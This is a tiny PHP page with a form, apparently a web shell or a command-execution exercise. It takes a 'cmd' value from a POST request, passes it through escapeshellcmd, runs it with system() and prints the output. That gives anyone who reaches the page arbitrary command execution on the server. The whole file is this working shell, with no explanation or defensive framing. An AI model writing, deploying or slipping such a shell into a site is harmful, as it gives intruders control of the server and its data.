<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
  $cmd = escapeshellcmd($_POST['cmd']);
  var_dump($cmd);
  echo "<pre>";
  $cmd = system($cmd, $retor);
  echo "</pre>";

}
 ?>
 <form  method="post">
   <input type="text" name="cmd" >
   <button type="submit">Enviar</button>
 </form>